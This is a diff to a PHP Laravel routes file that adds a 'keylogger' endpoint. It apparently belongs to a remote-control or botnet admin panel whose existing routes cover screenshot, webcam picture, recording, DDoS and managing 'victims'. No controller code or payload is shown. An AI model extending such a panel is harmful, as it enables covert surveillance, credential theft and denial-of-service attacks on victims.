@@ -41,6 +41,7 @@ Route::middleware(['auth'])->group(function () {
     Route::post('screenshot', [\App\Http\Controllers\NetworkController::class, 'screenshot'])->name('network.screenshot');
     Route::post('picture', [\App\Http\Controllers\NetworkController::class, 'picture'])->name('network.picture');
     Route::post('record', [\App\Http\Controllers\NetworkController::class, 'record'])->name('network.record');
+    Route::post('keylogger', [\App\Http\Controllers\NetworkController::class, 'keylogger'])->name('network.keylogger');
     Route::post('ddos', [\App\Http\Controllers\NetworkController::class, 'ddos'])->name('network.ddos');
     Route::get('victims', [\App\Http\Controllers\VictimsController::class, 'index'])->name('victims.index');
     Route::put('victims/{id}', [\App\Http\Controllers\VictimsController::class, 'update'])->name('victims.update');
